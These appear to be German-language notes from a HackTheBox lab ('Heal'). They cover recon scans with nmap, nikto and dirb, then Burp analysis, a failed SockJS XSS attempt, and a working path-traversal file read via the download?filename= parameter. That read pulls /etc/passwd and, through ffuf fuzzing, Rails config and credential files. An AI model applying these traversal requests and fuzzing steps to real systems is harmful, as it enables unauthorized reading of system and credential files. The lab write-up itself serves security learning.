# Main Domain http://heal.htb

# Nmap scan
![nmap-scan-main.png](../../../img/nmap-scan-main.png)

Nmap:
Command zusammengebaut mit der Hilfe von: https://www.stationx.net/nmap-cheat-sheet/

```
Command:

sudo nmap -sS -p- -sV -version-all -A -T4 -sC -vvv -oN nmap-scan.txt 10.10.11.46
```

```
Result:

##### Nmap 7.95 scan initiated Thu Apr 24 06:11:59 2025 as: /usr/lib/nmap/nmap -sS -p- -sV -version-all -A -T4 -sC -vvv -oN nmap-scan.txt 10.10.11.46
Nmap scan report for 10.10.11.46
Host is up, received echo-reply ttl 63 (0.028s latency).
Scanned at 2025-04-24 06:11:59 CDT for 43s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=4/24%OT=22%CT=1%CU=43670%PV=Y%DS=2%DC=T%G=Y%TM=680A1CA
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 11.826 days (since Sat Apr 12 10:23:34 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   82.87 ms 10.10.16.1
2   21.33 ms 10.10.11.46

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
#### Nmap done at Thu Apr 24 06:12:42 2025 -- 1 IP address (1 host up) scanned in 43.74 seconds
```

## Ergebnis:
- Port 22 (ssh) offen
- Port 80 (http) offen
  - => Es läuft eine Website auf nginx 1.18.0 (Ubuntu)
---

# Whatweb Scan
```
Command:

whatweb http://heal.htb
```
```
Result:

http://heal.htb [200 OK] 
Country[RESERVED][ZZ],
HTML5,
HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)],
IP[10.10.11.46],
Script, 
Title[Heal],
X-Powered-By[Express], 
nginx[1.18.0]
```
## Ergebnis:
- Framework Express wird verwendet
---


# Nikto Scan
![nikto-scan-main.png](../../../img/nikto-scan-main.png)
```
Command:

nikto -h http://heal.htb -output nikto-scan.txt
```

```
Result:

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.46
+ Target Hostname:    heal.htb
+ Target Port:        80
+ Start Time:         2025-04-24 12:54:03 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: Retrieved x-powered-by header: Express.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD .
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-04-24 13:07:07 (GMT-5) (784 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
## Ergebnis:
- /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
---

# dirb Scan
```
Command:

dirb http://heal.htb
```

```
Result:

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr 26 08:14:27 2025
URL_BASE: http://heal.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://heal.htb/ ----
+ http://heal.htb/favicon.ico (CODE:200|SIZE:34452)                                                                                                        
+ http://heal.htb/robots.txt (CODE:200|SIZE:67)                                                                                                            
                                                                                                                                                           
-----------------
END_TIME: Sat Apr 26 08:37:20 2025
DOWNLOADED: 4612 - FOUND: 2
```
## Ergebnis:
- Zwei Pfade gefunden, die aber keine relevanz hatten
---



# BurpSuite - Requests anschauen
Interessant weil dort Parameter zu sehen sind

![Burp](../../../img/burp-suite_interesting-requests.png)

---
## GET - http://heal.htb/sockjs-node/info?t=1745497786739
![GET_param_1.png](../../../img/GET_param_1.png)
```
Request:

http://heal.htb/sockjs-node/info?t=1745497786739
```

```
Response:

  {
    "websocket": true,
    "origins": ["*:*"],
    "cookie_needed": false,
    "entropy": 1699642884
  }
```
Websockets sind erlaubt
=> Erstmal anschauen wie Websockets funktionieren:
- https://www.youtube.com/watch?v=1BfCnjr_Vjg
- https://www.youtube.com/watch?v=xIjnXwob8ic (Richtig gute und ausführliche Erklärung!)
- https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html?highlight=websocke#what-are-websockets (Hier geschaut, wie die initiale WS verbindung aussieht)

=> weitere Requests anschauen um zu sehen, wo die Verbindung aufgebaut werden soll





---
## GET - http://heal.htb/sockjs-node/987/dw5uclg4/websocket
Websocket Verbindungsaufbau:
- Initial über HTTP
- Upgrade auf WS

Initial über HTTP:
![img_1.png](../../../img/websocket-request_doesnt-work.png)
- Verbindung soll aufgebaut werden, aber die Websocket Request ist nicht valide
  - Warum?
    - t
TODO - warum hier websocket nix gehen diese????
---





## POST - http://heal.htb/sockjs-node/862/jmm2xqzl/xhr_streaming?t=1745497787461
![POST_param_1.png](../../../img/POST_param_1.png)

```
Request:

http://heal.htb/sockjs-node/862/jmm2xqzl/xhr_streaming?t=1745497787461
```
```
Response:

405 Method not allowed
```
---





## GET - http://heal.htb/sockjs-node/862/un0nxlzy/htmlfile?c=_jp.aqe2epm
![GET_param_2.png](../../../img/GET_param_2.png)

![img.png](../../../img/GET-response-param-2.png)
```
Request:

http://heal.htb/sockjs-node/862/un0nxlzy/htmlfile?c=_jp.aqe2epm
```

```
Response:

- HTML site with 'Don't panic!'

<script>
  document.domain = document.domain;
  var c = parent._jp.aqe2epm;
  c.start();
  function p(d) {c.message(d);};
  window.onload = function() {c.stop();};
</script>
```

### Ergebnis:
- Anhand vom Pfad kann man erkennen, dass sockjs-node verwendet wird => JavaScript wird verwendet
- Nach sockjs cve gegoogelt und herausgefunden, dass es eine DoS und XSS Schwachstelle gibt:
  - https://security.snyk.io/package/npm/sockjs
    - XSS möglich in allen Versionen die <0.3.0
    - XSS versucht (CVE XSS: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-8823)
    - PoC: https://github.com/theyiyibest/Reflected-XSS-on-SockJS
      - hat nicht geklappt => Version muss >=0.3.0 sein


#### Weiter:
Ausprobieren ob LFI möglich ist und ich so an mehr informationen herankomme

![img.png](../../../img/LFI_try.png)

```
Request:

http://heal.htb/sockjs-node/862/un0nxlzy/htmlfile?c=_jp.aqe2epm
```
```
Response:

500 Internal Server Error
invalid "callback" parameter
```
---





# Website Enumeration
## Login Page
![login-page.png](../../../img/login-page.png)
---

## Create Account Page

![img.png](../../../img/sign-up.png)

### Anfängliche Probleme
- Ging anfangs nicht, weil ich vergessen hatte die IP einzutragen: siehe siehe [hier](../../scanning/domains/api.heal.htb.md#dummheit)

### Ergebnis:
![img.png](../../../img/sign-up-data.png)
```
Request:

POST /signup HTTP/1.1
Host: api.heal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 105
Origin: http://heal.htb
Connection: keep-alive
Referer: http://heal.htb/
Priority: u=0

{
  "username":"homer1337",
  "fullname":"Homer Simpson",
  "email":"homer.simpson@test.de",
  "password":"homer123"
}
```
```
Response:

HTTP/1.1 201 Created
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 12:20:40 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 95
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
etag: W/"3a5c6e581b171a2b3539b0603cb68825"
cache-control: max-age=0, private, must-revalidate
x-request-id: cb277c79-15f1-4977-b32a-49c5947a5dac
x-runtime: 0.327145
vary: Origin

{
  "token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo5fQ.ILOcMzCTZe1wDWM5gXNbBYBOPpSX43bOFdIKjJfpLU8"
}
```
- Es wird bei der Erstellung eines Accounts ein Token erstellt

## Resume Builder Page
Etwas auf der Seite umschauen um zu sehen, was denn alles möglich ist.
Dabei festgestellt, dass nachdem ein Account erstellt worden ist man Daten eingeben kann und basierend auf diesen
eine PDF Datei generiert wird und man diese exportieren kann.

![img.png](../../../img/resume-builder-page.png)


## Profile Page
![img.png](../../../img/profile-button.png)


## Survey Page

[take-survey.heal.htb.md](./take-survey.heal.htb.md)




# BurpSuite
Mit Burp anschauen, was passiert wenn man sich die PDF generieren lässt und die Requests speichern.

![img.png](../../../img/subdomain-exports-path.png)

```
Request:

{
    "content":"\n      
    <!DOCTYPE html>\n
        <html>\n
            <head>\n
                <style>
                    \n body {
                        \n font-family: 'Roboto', sans-serif;
                        \n color: #333;
                        \n line-height: 1.6;
                        \n background-color: #f9f9f9;
                        \n padding: 20px;
                        \n
                    }

                    \n .resume-container {
                        \n max-width: 900px;
                        \n margin: 50px auto;
                        \n padding: 40px;
                        \n background-color: #fff;
                        \n box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
                        \n border-radius: 10px;
                        \n
                    }

                    \n h1, h2 {
                        \n color: #007bff;
                        \n margin-bottom: 20px;
                        \n
                    }

                    \n h1 {
                        \n font-size: 2.5em;
                        \n text-align: center;
                        \n margin-bottom: 40px;
                        \n
                    }

                    \n h2 {
                        \n font-size: 1.5em;
                        \n margin-top: 40px;
                        \n
                    }

                    \n .section {
                        \n margin-bottom: 30px;
                        \n
                    }

                    \n .section p {
                        \n margin: 5px 0;
                        \n
                    }

                    \n .section p strong {
                        \n color: #555;
                        \n
                    }

                    \n .contact-info {
                        \n text-align: center;
                        \n margin-bottom: 40px;
                        \n
                    }

                    \n .contact-info p {
                        \n margin: 5px 0;
                        \n font-size: 1.1em;
                        \n
                    }

                    \n .contact-info p strong {
                        \n color: #007bff;
                        \n
                    }

                    \n .education-section, .experience-section {
                        \n padding: 20px;
                        \n background-color: #f1f1f1;
                        \n border-radius: 5px;
                        \n margin-bottom: 20px;
                        \n
                    }

                    \n .education-section p, .experience-section p {
                        \n margin: 10px 0;
                        \n
                    }

                    \n        
                </style>
                \n
            </head>
            \n
            <body>\n
                <div class=\"resume-container\">\n 
                    <h1>Homer</h1>\n 
                    <p>Email: homer.simpson@test.de</p>\n 
                    <p>Phone: 1337</p>\n 
                    <h2>Education</h2>\n 
                    \n
                
                    <div class=\"education-section\">\n 
                        <p><strong>Institution:</strong> Harvard </p>\n 
                        <p><strong>Role:</strong> Gramaar</p>\n
                        <p><strong>Summary:</strong> I'm lernt lot here </p>\n
                    </div>
                
                    \n \n
                 
                    <h2>Experience</h2>\n \n
                    <div class=\"experience-section\">\n 
                        <p><strong>Company:</strong> Super Amazing Company</p>\n 
                        <p><strong>Role:</strong> Bestest at everything</p>\n 
                        <p><strong>Summary:</strong> I ware bestest mployee the eva had.</p>\n
                    </div>
                
                    \n \n
                 
                    <h2>Projects</h2>\n 
                    <p>- test</p>\n 
                
                    <h2>Skills</h2>\n 
                    <p>everything</p>\n 
                
                    <h2>Languages</h2>\n 
                    <p>al oof them</p>\n
                </div>
            \n
            </body>
            \n
        </html>\n    ",
    "format":"pdf"
}
```

```
Response:

{
    "message":"PDF created successfully",
    "filename":"411b67f9c828d4f0c156.pdf"
}
```

## Ergebnis:
### Zur Autorisierung wird ein Bearer Token verwendet
Bearer Tokens Prinzip nochmal wiederholen
- https://www.youtube.com/watch?v=2ZLHabaZZJs - YT Video
- Anwendungssicherheit Folien - 04 Entwurf-04-Authentifizierung#HTTP Auth mit Bearer Token

### Neue Interessante Pfade durch Burp:
```
OPTIONS http://api.heal.htb/download?filename=411b67f9c828d4f0c156.pdf

Response Header:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 11:40:18 GMT
Content-Length: 0
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
access-control-allow-headers: authorization
```
```
POST http://api.heal.htb/exports

Response Header:
HTTP/1.1 201 Created
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 11:40:18 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 76
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
etag: W/"29caa47ab66df4f53921c36538cedeca"
cache-control: max-age=0, private, must-revalidate
x-request-id: 1635dbdf-fb6c-460d-9b90-5ec191956328
x-runtime: 0.317247
vary: Origin

{
  "message":"PDF created successfully",
  "filename":"36015cd7dbb9ebdf7e5d.pdf"
}
```

### Neue Erkenntnisse aus der Request:
1. Dadurch, dass im Response Header <code>access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD</code> 
stand bin ich in der Lage das HTTP Verb zu verändern und die Request erneut zu senden

#### Idee: Über eine LFI die <code>/etc/passwd</code> herunterladen kann
- Vorgehen:
1. Über BurpSuite den Request an den Repeater senden und dort die Request manipulieren
2. Header in GET ändern: ```http://api.heal.htb/download?filename=/etc/passwd```

#### Ergebnis:
```
Request:

GET /download?filename=/etc/passwd HTTP/1.1
Host: api.heal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
Referer: http://heal.htb/
Origin: http://heal.htb
Connection: keep-alive
Priority: u=4
```
```
Response:

HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 12:09:33 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 26
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
vary: Accept, Origin
cache-control: no-cache
x-request-id: 06af472b-dcfd-4255-8671-1cae9faefb7f
x-runtime: 0.002224

{
  "errors":"Invalid token"
}
```
![img_1.png](../../../img/pdf-LFI-try.png)
- Er benötigt einen validen Token => Ich muss den Token mitschicken, welchen ich bei der Anmeldung bekommen habe
   (oder erstelle einen neuen Account und nehme diesen Token)

Vorgehen:

- Ich nehme den Token aus der Anmeldung:
```eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo5fQ.ILOcMzCTZe1wDWM5gXNbBYBOPpSX43bOFdIKjJfpLU8``` und füge ihn der 
Request hinzu

![img.png](../../../img/LFI-works.png)

```
Request:

GET /download?filename=/etc/passwd HTTP/1.1
Host: api.heal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
Referer: http://heal.htb/
Origin: http://heal.htb
Connection: keep-alive
Priority: u=4
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo5fQ.ILOcMzCTZe1wDWM5gXNbBYBOPpSX43bOFdIKjJfpLU8
```

```
Response:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 13:18:20 GMT
Content-Type: application/octet-stream
Content-Length: 2120
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: attachment; filename="passwd"; filename*=UTF-8''passwd
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 859964c9-2e41-4295-9e4f-73c616fc8a48
x-runtime: 0.003093
vary: Origin

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Ergebnis:
- Alle User ersichtlich
  ```ralph:x:1000:1000:ralph:/home/ralph:/bin/bash```
nochmal bestätigt, dass ralph wirklich ein User ist

```
ralph – Username (login name)

x – Placeholder for the password (the actual password is stored in /etc/shadow)

1000 – User ID (UID); 1000 is typically the first regular user created during system installation (root has UID 0)

1000 – Group ID (GID); refers to the user's primary group, often with the same name as the user

ralph – Comment or GECOS field; usually contains the user's full name, but can also be empty or hold other information

/home/ralph – Home directory; the user's personal directory

/bin/bash – Login shell; the default shell launched when the user logs in (in this case, Bash)
```
---

# Weitere LFI auf api.heal.htb
Dadurch, dass auf der api subdomain Ruby läuft, macht es Sinn dort zu schauen, ob es config files gibt.

Wo liegen diese standardmäßig?/Welche gibt es?
1. Quellen (Ruby configuration files):
   1. https://dev.to/vvo/secrets-environment-variables-config-files-the-ruby-on-rails-case-433f
   2. https://guides.rubyonrails.org/security.html#custom-credentials
   3. https://guides.rubyonrails.org/v7.1/debugging_rails_applications.html#the-logger

2. Anhand von den Quellen eigene kleine Liste zusammengebaut:
```
---------------
ruby-paths.txt
---------------
/app/controllers/application_controller.rb
/app/controllers/concerns/authentication.rb
/app/controllers/passwords_controller.rb
/app/controllers/sessions_controller.rb
/app/mailers/password_mailer.rb
/app/mailers/passwords_mailer.rb
/app/models/current.rb
/app/models/session.rb
/app/models/user.rb
/config/admin.rb
/config/api.rb
/config/application.rb
/config/boot.rb
/config/cable.yml
/config/credentials.yml
/config/credentials.yml.enc
/config/credentials/staging.yml.enc
/config/database.yml
/config/environments/development.rb
/config/environments/production.rb
/config/environments/staging.rb
/config/environments/test.rb
/config/initializers/content_security_policy.rb
/config/initializers/cors.rb
/config/initializers/filter_parameter_logging.rb
/config/initializers/permissions_policy.rb
/config/initializers/permolicy.rb
/config/puma.rb
/config/routes.rb
/config/routes/admin.rb
/config/routes/external/admin.rb
/config/wrap_parameters.rb
/db/schema.rb
/db/schema.sql
/log/development.log 
/log/production.log
```

3. Manuell ```/app/controllers/application_controller.rb``` getestet 
und den pfad so lange nach oben gegangen bis es bei ```../../app/controllers/application_controller.rb```
geklappt hat

5. Jetzt mit ```ffuf``` (https://github.com/ffuf/ffuf) die Liste anwenden und schauen welche Pfade es gibt
   - Komisch dabei: Bei mehrfachem scannen hatte ich teilweise unterschiedliche Pfade
```
Description:

ffuf  -u = HOST
      -w = WORDLIST
      -H = HEADER
      -mc= MATCH STATUS CODE
```

![fuzzing-ruby-api-subdomain.png](../../../img/fuzzing-ruby-api-subdomain.png)

```
ffuf  -u http://api.heal.htb/download?filename=../../FUZZ 
      -w ruby-paths.txt 
      -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" 
      -mc 200
```

```
Result Paths:

/config/environments/test.rb                        [Status: 200, Size: 2643, Words: 348, Lines: 65, Duration: 37ms]
/config/initializers/filter_parameter_logging.rb    [Status: 200, Size: 448, Words: 57, Lines: 9, Duration: 231ms]
/config/initializers/cors.rb                        [Status: 200, Size: 500, Words: 77, Lines: 17, Duration: 332ms]
/config/cable.yml                                   [Status: 200, Size: 191, Words: 21, Lines: 11, Duration: 729ms]
/app/models/user.rb                                 [Status: 200, Size: 328, Words: 45, Lines: 16, Duration: 835ms]
/app/controllers/application_controller.rb          [Status: 200, Size: 56, Words: 4, Lines: 3, Duration: 929ms]
/config/environments/production.rb                  [Status: 200, Size: 4090, Words: 594, Lines: 91, Duration: 1032ms]
/config/database.yml                                [Status: 200, Size: 636, Words: 93, Lines: 26, Duration: 1130ms]
/config/credentials.yml.enc                         [Status: 200, Size: 456, Words: 1, Lines: 1, Duration: 1232ms]
/config/environments/development.rb                 [Status: 200, Size: 2513, Words: 339, Lines: 74, Duration: 1330ms]
:: Progress: [34/34] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

more from other ffuf fuzz:
/config/boot.rb
/log/development.log
/config/application.rb
/config/routes.rb
/config/puma.rb
```

[API Path Findings](../api/api-findings.md)

## Relevante Ergebnisse:
[Gaining DB Access](../../gaining-access/main-gaining-access.md#1-gaining-db-access)
---










